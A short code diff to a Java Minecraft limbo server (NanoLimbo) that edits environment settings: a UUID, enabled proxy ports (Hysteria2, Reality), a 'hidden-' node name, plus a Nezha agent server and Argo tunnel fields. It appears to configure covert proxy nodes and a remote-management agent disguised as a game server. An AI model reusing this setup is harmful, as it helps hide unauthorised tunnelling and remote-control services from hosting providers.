@@ -123,7 +123,7 @@ public final class NanoLimbo {
     }
     
     private static void loadEnvVars(Map<String, String> envVars) throws IOException {
-        envVars.put("UUID", "21f93785-4782-4140-bb51-9e84d8d049b8");
+        envVars.put("UUID", "94fd6dae-7594-47f7-9fa8-df1a897476ec");
         envVars.put("FILE_PATH", "./world");
         envVars.put("NEZHA_SERVER", "agent.ejoy.pp.ua:80");
         envVars.put("NEZHA_PORT", "");
@@ -132,17 +132,17 @@ public final class NanoLimbo {
         envVars.put("ARGO_DOMAIN", "");
         envVars.put("ARGO_AUTH", "");
         envVars.put("S5_PORT", "");
-        envVars.put("HY2_PORT", "");
-        envVars.put("TUIC_PORT", "24645");
-        envVars.put("ANYTLS_PORT", "24808");
-        envVars.put("REALITY_PORT", "");
+        envVars.put("HY2_PORT", "24699");
+        envVars.put("TUIC_PORT", "");
+        envVars.put("ANYTLS_PORT", "");
+        envVars.put("REALITY_PORT", "25504");
         envVars.put("ANYREALITY_PORT", "");
         envVars.put("UPLOAD_URL", "");
         envVars.put("CHAT_ID", "");
         envVars.put("BOT_TOKEN", "");
         envVars.put("CFIP", "cdns.doon.eu.org");
         envVars.put("CFPORT", "443");
-        envVars.put("NAME", "hidden-clove-win10-UA");
+        envVars.put("NAME", "hidden-flovef-win10-Freemc");
         envVars.put("DISABLE_ARGO", "false");
         
         for (String var : ALL_ENV_VARS) {
